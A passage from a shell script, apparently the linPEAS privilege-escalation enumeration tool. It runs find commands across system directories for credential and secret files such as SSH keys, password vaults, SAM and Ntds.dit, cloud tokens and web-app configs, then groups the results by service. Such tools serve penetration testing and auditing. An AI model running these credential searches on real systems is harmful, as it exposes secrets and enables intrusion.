\"groups.xml\" -o -name \".github\" -o -name \"authorized_keys\" -o -name \"ws_ftp.ini\" -o -name \".secrets.mkey\" -o -name \".profile\" -o -name \"docker.socket\" -o -name \"wsl.exe\" -o -name \"gvm-tools.conf\" -o -name \"KeePass.config*\" -o -name \"*password*\" -o -name \"kcpassword\" -o -name \"bash.exe\" -o -name \"crio.sock\" -o -name \"secrets.yml\" -o -name \"NetSetup.log\" -o -name \"*.ovpn\" -o -name \"snmpd.conf\" -o -name \"unattended.xml\" -o -name \"SAM\" -o -name \"*.timer\" -o -name \"system.sav\" -o -name \"database.php\" -o -name \"sentry.conf.py\" -o -name \"pg_hba.conf\" -o -name \"error.log\" -o -name \".lesshst\" -o -name \"*.csr\" -o -name \"index.dat\" -o -name \"sitemanager.xml\" -o -name \".gitconfig\" -o -name \".msmtprc\" -o -name \"vault-ssh-helper.hcl\" -o -name \"frakti.sock\" -o -name \"*.p12\" -o -name \"*.ftpconfig\" -o -name \"ftp.ini\" -o -name \"AppEvent.Evt\" -o -name \"setupinfo.bak\" -o -name \"containerd.sock\" -o -name \"rocketchat.service\" -o -name \".ldaprc\" -o -name \"*.socket\" -o -name \"Dockerfile\" -o -name \"httpd.conf\" -o -name \"wcx_ftp.ini\" -o -name \"accessTokens.json\" -o -name \"appcmd.exe\" -o -name \"KeePass.enforced*\" -o -name \"*.rdg\" -o -name \"unattend.inf\" -o -name \"credentials.db\" -o -name \"RDCMan.settings\" -o -name \"kadm5.acl\" -o -name \"printers.xml\" -o -name \".recently-used.xbel\" -o -name \"php.ini\" -o -name \"*.viminfo\" -o -name \"nginx.conf\" -o -name \"*.kdbx\" -o -name \"SecEvent.Evt\" -o -name \"*_history*\" -o -name \"*.keytab\" -o -name \"pwd.ibd\" -o -name \"hostapd.conf\" -o -name \"id_dsa*\" -o -name \"iis6.log\" -o -name \"passwd.ibd\" -o -name \"FreeSSHDservice.ini\" -o -name \"redis.conf\" -o -name \"*credential*\" -o -name \"anaconda-ks.cfg\" -o -name \"agent*\" -o -name \"ftp.config\" -o -name \"SYSTEM\" -o -name \".htpasswd\" -o -name \"sess_*\" -o -name \"rsyncd.conf\" -o -name \"datasources.xml\" -o -name \"recentservers.xml\" -o -name \"known_hosts\" -o -name \".sudo_as_admin_successful\" -o -name \"*.gnupg\" -o -name \"Ntds.dit\" -o -name \"sites.ini\" -o -name \"https-xampp.conf\" -o -name \"unattend.xml\" -o -name \"pgsql.conf\" -o -name \"tomcat-users.xml\" -o -name \"config.php\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_USR=`eval_bckgrd "find /usr -name \"storage.php\" -o -name \"ipsec.conf\" -o -name \".bashrc\" -o -name \".plan\" -o -name \"setupinfo\" -o -name \"*.sqlite\" -o -name \"jetty-realm.properties\" -o -name \"*.crt\" -o -name \"*.jks\" -o -name \"scclient.exe\" -o -name \"*.keystore\" -o -name \"software\" -o -name \".pypirc\" -o -name \"sssd.conf\" -o -name \"ffftp.ini\" -o -name \"*.cer\" -o -name \".vault-token\" -o -name \"id_rsa*\" -o -name \"backups\" -o -name \"autologin.conf\" -o -name \"filezilla.xml\" -o -name \"server.xml\" -o -name \".git-credentials\" -o -name \"glusterfs.ca\" -o -name \"zabbix_agentd.conf\" -o -name \"default.sav\" -o -name \"dockershim.sock\" -o -name \"ipsec.secrets\" -o -name \"postgresql.conf\" -o -name \"scheduledtasks.xml\" -o -name \"racoon.conf\" -o -name \"TokenCache.dat\" -o -name \"log4j-core*.jar\" -o -name \".erlang.cookie\" -o -name \"passwd\" -o -name \"protecteduserkey.bin\" -o -name \"cesi.conf\" -o -name \"mosquitto.conf\" -o -name \"ssh*config\" -o -name \"*.pem\" -o -name \"AzureRMContext.json\" -o -name \"ntuser.dat\" -o -name \"*config*.php\" -o -name \"*.swp\" -o -name \"000-default.conf\" -o -name \"zabbix_server.conf\" -o -name \"supervisord.conf\" -o -name \"sysprep.inf\" -o -name \"ConsoleHost_history.txt\" -o -name \"kibana.y*ml\" -o -name \"*vnc*.ini\" -o -name \"access_tokens.json\" -o -name \".env\" -o -name \".k5login\" -o -name \"*.keyring\" -o -name \"*vnc*.xml\" -o -name \"*.pgp\" -o -name \".google_authenticator\" -o -name \"secrets.ldb\" -o -name \"backup\" -o -name \"authorized_hosts\" -o -name \"legacy_credentials.db\" -o -name \"ddclient.conf\" -o -name \"passbolt.php\" -o -name \"krb5.conf\" -o -name \"pgadmin*.db\" -o -name \"autologin\" -o -name \"unattend.txt\" -o -name \"*vnc*.txt\" -o -name \"debian.cnf\" -o -name \"fastcgi_params\" -o -name \"*.psk\" -o -name \"hosts.equiv\" -o -name \"influxdb.conf\" -o -name \"sysprep.xml\" -o -name \"settings.php\" -o -name \"azureProfile.json\" -o -name \"*.gpg\" -o -name \"glusterfs.pem\" -o -name \"web*.config\" -o -name \"glusterfs.key\" -o -name \"*.sqlite3\" -o -name \"rktlet.sock\" -o -name \"pagefile.sys\" -o -name \".wgetrc\" -o -name \"rsyncd.secrets\" -o -name \"wp-config.php\" -o -name \"cloud.cfg\" -o -name \"elasticsearch.y*ml\" -o -name \"security.sav\" -o -name \".git\" -o -name \"https.conf\" -o -name \"access_tokens.db\" -o -name \"*.db\" -o -name \"winscp.ini\" -o -name \"psk.txt\" -o -name \"software.sav\" -o -name \"my.cnf\" -o -name \"mongod*.conf\" -o -name \"creds*\" -o -name \"KeePass.ini\" -o -name \"*.service\" -o -name \"password*.ibd\" -o -name \"*.key\" -o -name \"drives.xml\" -o -name \"*.pfx\" -o -name \"mariadb.cnf\" -o -name \"my.ini\" -o -name \"db.php\" -o -name \"gitlab.yml\" -o -name \"*.der\" -o -name \"*vnc*.c*nf*\" -o -name \"docker-compose.yml\" -o -name \"docker.sock\" -o -name \"access.log\" -o -name \".rhosts\" -o -name \"gitlab.rm\" -o -name \"groups.xml\" -o -name \".github\" -o -name \"authorized_keys\" -o -name \"ws_ftp.ini\" -o -name \".secrets.mkey\" -o -name \".profile\" -o -name \"docker.socket\" -o -name \"wsl.exe\" -o -name \"gvm-tools.conf\" -o -name \"KeePass.config*\" -o -name \"*password*\" -o -name \"kcpassword\" -o -name \"bash.exe\" -o -name \"crio.sock\" -o -name \"secrets.yml\" -o -name \"NetSetup.log\" -o -name \"*.ovpn\" -o -name \"snmpd.conf\" -o -name \"unattended.xml\" -o -name \"SAM\" -o -name \"*.timer\" -o -name \"system.sav\" -o -name \"database.php\" -o -name \"sentry.conf.py\" -o -name \"pg_hba.conf\" -o -name \"error.log\" -o -name \".lesshst\" -o -name \"*.csr\" -o -name \"index.dat\" -o -name \"sitemanager.xml\" -o -name \".gitconfig\" -o -name \".msmtprc\" -o -name \"vault-ssh-helper.hcl\" -o -name \"frakti.sock\" -o -name \"*.p12\" -o -name \"*.ftpconfig\" -o -name \"ftp.ini\" -o -name \"AppEvent.Evt\" -o -name \"setupinfo.bak\" -o -name \"containerd.sock\" -o -name \"rocketchat.service\" -o -name \".ldaprc\" -o -name \"*.socket\" -o -name \"Dockerfile\" -o -name \"httpd.conf\" -o -name \"wcx_ftp.ini\" -o -name \"accessTokens.json\" -o -name \"appcmd.exe\" -o -name \"KeePass.enforced*\" -o -name \"*.rdg\" -o -name \"unattend.inf\" -o -name \"credentials.db\" -o -name \"RDCMan.settings\" -o -name \"kadm5.acl\" -o -name \"printers.xml\" -o -name \".recently-used.xbel\" -o -name \"php.ini\" -o -name \"*.viminfo\" -o -name \"nginx.conf\" -o -name \"*.kdbx\" -o -name \"SecEvent.Evt\" -o -name \"*_history*\" -o -name \"*.keytab\" -o -name \"pwd.ibd\" -o -name \"hostapd.conf\" -o -name \"id_dsa*\" -o -name \"iis6.log\" -o -name \"passwd.ibd\" -o -name \"FreeSSHDservice.ini\" -o -name \"redis.conf\" -o -name \"*credential*\" -o -name \"anaconda-ks.cfg\" -o -name \"ftp.config\" -o -name \"SYSTEM\" -o -name \".htpasswd\" -o -name \"rsyncd.conf\" -o -name \"datasources.xml\" -o -name \"recentservers.xml\" -o -name \"known_hosts\" -o -name \".sudo_as_admin_successful\" -o -name \"*.gnupg\" -o -name \"Ntds.dit\" -o -name \"sites.ini\" -o -name \"https-xampp.conf\" -o -name \"unattend.xml\" -o -name \"pgsql.conf\" -o -name \"tomcat-users.xml\" -o -name \"config.php\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_VAR=`eval_bckgrd "find /var -name \"storage.php\" -o -name \"ipsec.conf\" -o -name \".bashrc\" -o -name \".plan\" -o -name \"setupinfo\" -o -name \"*.sqlite\" -o -name \"jetty-realm.properties\" -o -name \"*.crt\" -o -name \"*.jks\" -o -name \"scclient.exe\" -o -name \"*.keystore\" -o -name \"software\" -o -name \".pypirc\" -o -name \"sssd.conf\" -o -name \"ffftp.ini\" -o -name \"*.cer\" -o -name \".vault-token\" -o -name \"id_rsa*\" -o -name \"backups\" -o -name \"autologin.conf\" -o -name \"filezilla.xml\" -o -name \"server.xml\" -o -name \".git-credentials\" -o -name \"glusterfs.ca\" -o -name \"zabbix_agentd.conf\" -o -name \"default.sav\" -o -name \"dockershim.sock\" -o -name \"ipsec.secrets\" -o -name \"postgresql.conf\" -o -name \"scheduledtasks.xml\" -o -name \"racoon.conf\" -o -name \"TokenCache.dat\" -o -name \"log4j-core*.jar\" -o -name \".erlang.cookie\" -o -name \"passwd\" -o -name \"protecteduserkey.bin\" -o -name \"cesi.conf\" -o -name \"mosquitto.conf\" -o -name \"*.pem\" -o -name \"AzureRMContext.json\" -o -name \"ntuser.dat\" -o -name \"*config*.php\" -o -name \"*.swp\" -o -name \"000-default.conf\" -o -name \"zabbix_server.conf\" -o -name \"supervisord.conf\" -o -name \"sysprep.inf\" -o -name \"ConsoleHost_history.txt\" -o -name \"kibana.y*ml\" -o -name \"*vnc*.ini\" -o -name \"access_tokens.json\" -o -name \".env\" -o -name \".k5login\" -o -name \"*.keyring\" -o -name \"*vnc*.xml\" -o -name \"*.pgp\" -o -name \".google_authenticator\" -o -name \"secrets.ldb\" -o -name \"backup\" -o -name \"authorized_hosts\" -o -name \"legacy_credentials.db\" -o -name \"ddclient.conf\" -o -name \"passbolt.php\" -o -name \"krb5.conf\" -o -name \"pgadmin*.db\" -o -name \"autologin\" -o -name \"unattend.txt\" -o -name \"*vnc*.txt\" -o -name \"debian.cnf\" -o -name \"fastcgi_params\" -o -name \"*.psk\" -o -name \"hosts.equiv\" -o -name \"influxdb.conf\" -o -name \"sysprep.xml\" -o -name \"settings.php\" -o -name \"azureProfile.json\" -o -name \"*.gpg\" -o -name \"glusterfs.pem\" -o -name \"web*.config\" -o -name \"glusterfs.key\" -o -name \"*.sqlite3\" -o -name \"rktlet.sock\" -o -name \"pagefile.sys\" -o -name \".wgetrc\" -o -name \"rsyncd.secrets\" -o -name \"wp-config.php\" -o -name \"cloud.cfg\" -o -name \"elasticsearch.y*ml\" -o -name \"security.sav\" -o -name \".git\" -o -name \"https.conf\" -o -name \"access_tokens.db\" -o -name \"*.db\" -o -name \"winscp.ini\" -o -name \"psk.txt\" -o -name \"software.sav\" -o -name \"my.cnf\" -o -name \"mongod*.conf\" -o -name \"creds*\" -o -name \"KeePass.ini\" -o -name \"*.service\" -o -name \"password*.ibd\" -o -name \"*.key\" -o -name \"drives.xml\" -o -name \"*.pfx\" -o -name \"mariadb.cnf\" -o -name \"my.ini\" -o -name \"db.php\" -o -name \"gitlab.yml\" -o -name \"*.der\" -o -name \"*vnc*.c*nf*\" -o -name \"docker-compose.yml\" -o -name \"docker.sock\" -o -name \"access.log\" -o -name \".rhosts\" -o -name \"gitlab.rm\" -o -name \"groups.xml\" -o -name \".github\" -o -name \"authorized_keys\" -o -name \"ws_ftp.ini\" -o -name \".secrets.mkey\" -o -name \".profile\" -o -name \"docker.socket\" -o -name \"wsl.exe\" -o -name \"gvm-tools.conf\" -o -name \"KeePass.config*\" -o -name \"*password*\" -o -name \"kcpassword\" -o -name \"bash.exe\" -o -name \"crio.sock\" -o -name \"secrets.yml\" -o -name \"NetSetup.log\" -o -name \"*.ovpn\" -o -name \"snmpd.conf\" -o -name \"unattended.xml\" -o -name \"SAM\" -o -name \"*.timer\" -o -name \"system.sav\" -o -name \"database.php\" -o -name \"sentry.conf.py\" -o -name \"pg_hba.conf\" -o -name \"error.log\" -o -name \".lesshst\" -o -name \"*.csr\" -o -name \"index.dat\" -o -name \"sitemanager.xml\" -o -name \".gitconfig\" -o -name \".msmtprc\" -o -name \"vault-ssh-helper.hcl\" -o -name \"frakti.sock\" -o -name \"*.p12\" -o -name \"*.ftpconfig\" -o -name \"ftp.ini\" -o -name \"AppEvent.Evt\" -o -name \"setupinfo.bak\" -o -name \"containerd.sock\" -o -name \"rocketchat.service\" -o -name \".ldaprc\" -o -name \"*.socket\" -o -name \"Dockerfile\" -o -name \"httpd.conf\" -o -name \"wcx_ftp.ini\" -o -name \"accessTokens.json\" -o -name \"appcmd.exe\" -o -name \"KeePass.enforced*\" -o -name \"*.rdg\" -o -name \"unattend.inf\" -o -name \"credentials.db\" -o -name \"RDCMan.settings\" -o -name \"kadm5.acl\" -o -name \"printers.xml\" -o -name \".recently-used.xbel\" -o -name \"php.ini\" -o -name \"*.viminfo\" -o -name \"nginx.conf\" -o -name \"*.kdbx\" -o -name \"SecEvent.Evt\" -o -name \"*_history*\" -o -name \"*.keytab\" -o -name \"pwd.ibd\" -o -name \"hostapd.conf\" -o -name \"id_dsa*\" -o -name \"iis6.log\" -o -name \"passwd.ibd\" -o -name \"FreeSSHDservice.ini\" -o -name \"redis.conf\" -o -name \"*credential*\" -o -name \"anaconda-ks.cfg\" -o -name \"ftp.config\" -o -name \"SYSTEM\" -o -name \".htpasswd\" -o -name \"sess_*\" -o -name \"rsyncd.conf\" -o -name \"datasources.xml\" -o -name \"recentservers.xml\" -o -name \"known_hosts\" -o -name \".sudo_as_admin_successful\" -o -name \"*.gnupg\" -o -name \"Ntds.dit\" -o -name \"sites.ini\" -o -name \"https-xampp.conf\" -o -name \"unattend.xml\" -o -name \"pgsql.conf\" -o -name \"tomcat-users.xml\" -o -name \"config.php\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_CONCOURSE_AUTH=`eval_bckgrd "find /concourse-auth -name \"*.timer\" -o -name \"*.service\" -o -name \"*.socket\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_CONCOURSE_KEYS=`eval_bckgrd "find /concourse-keys -name \"*.timer\" -o -name \"*.service\" -o -name \"*.socket\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`


  wait # Always wait at the end
  CONT_THREADS=0 #Reset the threads counter
fi 

if [ "$SEARCH_IN_FOLDER" ] || echo $CHECKS | grep -q procs_crons_timers_srvcs_sockets || echo $CHECKS | grep -q software_information || echo $CHECKS | grep -q interesting_files; then
  #GENERATE THE STORAGES OF THE FOUND FILES
  PSTORAGE_SYSTEMD=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/systemd|^/bin|^/private|^/system|^/media|^/var|^/usr|^/.cache|^/applications|^$GREPHOMESEARCH|^/snap|^/concourse-keys|^/run|^/srv|^/lib64|^/sys|^/etc|^/concourse-auth|^/sbin|^/lib32|^/cdrom|^/lib|^/opt|^/mnt|^/tmp" | grep -E ".*\.service$" | sort | uniq | head -n 70)
  PSTORAGE_TIMER=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/systemd|^/bin|^/private|^/system|^/media|^/var|^/usr|^/.cache|^/applications|^$GREPHOMESEARCH|^/snap|^/concourse-keys|^/run|^/srv|^/lib64|^/sys|^/etc|^/concourse-auth|^/sbin|^/lib32|^/cdrom|^/lib|^/opt|^/mnt|^/tmp" | grep -E ".*\.timer$" | sort | uniq | head -n 70)
  PSTORAGE_SOCKET=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/systemd|^/bin|^/private|^/system|^/media|^/var|^/usr|^/.cache|^/applications|^$GREPHOMESEARCH|^/snap|^/concourse-keys|^/run|^/srv|^/lib64|^/sys|^/etc|^/concourse-auth|^/sbin|^/lib32|^/cdrom|^/lib|^/opt|^/mnt|^/tmp" | grep -E ".*\.socket$" | sort | uniq | head -n 70)
  PSTORAGE_DBUS=$(echo -e "$FIND_DIR_ETC\n$FIND_DIR_SBIN\n$FIND_DIR_CACHE\n$FIND_DIR_MEDIA\n$FIND_DIR_PRIVATE\n$FIND_DIR_MNT\n$FIND_DIR_USR\n$FIND_DIR_OPT\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_SNAP\n$FIND_DIR_VAR\n$FIND_DIR_TMP\n$FIND_DIR_BIN\n$FIND_DIR_SRV\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_CDROM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/etc" | grep -E "system\.d$" | sort | uniq | head -n 70)
  PSTORAGE_MYSQL=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_DIR_ETC\n$FIND_DIR_SBIN\n$FIND_DIR_CACHE\n$FIND_DIR_MEDIA\n$FIND_DIR_PRIVATE\n$FIND_DIR_MNT\n$FIND_DIR_USR\n$FIND_DIR_OPT\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_SNAP\n$FIND_DIR_VAR\n$FIND_DIR_TMP\n$FIND_DIR_BIN\n$FIND_DIR_SRV\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_CDROM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -v -E 'mysql/mysql' | grep -E '^/etc/.*mysql|/usr/var/lib/.*mysql|/var/lib/.*mysql' | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E "mysql$|passwd\.ibd$|password.*\.ibd$|pwd\.ibd$" | sort | uniq | head -n 70)
  PSTORAGE_MARIADB=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E "mariadb\.cnf$|debian\.cnf$" | sort | uniq | head -n 70)
  PSTORAGE_POSTGRESQL=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E "pgadmin.*\.db$|pg_hba\.conf$|postgresql\.conf$|pgsql\.conf$" | sort | uniq | head -n 70)
  PSTORAGE_APACHE_NGINX=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_DIR_ETC\n$FIND_DIR_SBIN\n$FIND_DIR_CACHE\n$FIND_DIR_MEDIA\n$FIND_DIR_PRIVATE\n$FIND_DIR_MNT\n$FIND_DIR_USR\n$FIND_DIR_OPT\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_SNAP\n$FIND_DIR_VAR\n$FIND_DIR_TMP\n$FIND_DIR_BIN\n$FIND_DIR_SRV\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_CDROM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E "sites-enabled$|000-default\.conf$|php\.ini$|nginx\.conf$|nginx$" | sort | uniq | head -n 70)
  PSTORAGE_PHP_SESSIONS=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E '/tmp/.*sess_.*|/var/tmp/.*sess_.*' | grep -E "^/private|^/tmp|^/var|^/mnt" | grep -E "sess_.*$" | sort | uniq | head -n 70)
  PSTORAGE_PHP_FILES=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E ".*config.*\.php$|database\.php$|db\.php$|storage\.php$|settings\.php$" | sort | uniq | head -n 70)
  PSTORAGE_WORDPRESS=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E "wp-config\.php$" | sort | uniq | head -n 70)
  PSTORAGE_DRUPAL=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E '/default/settings.php' | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E "settings\.php$" | sort | uniq | head -n 70)
  PSTORAGE_MOODLE=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E 'moodle/config.php' | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E "config\.php$" | sort | uniq | head -n 70)
  PSTORAGE_TOMCAT=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E "tomcat-users\.xml$" | sort | uniq | head -n 70)
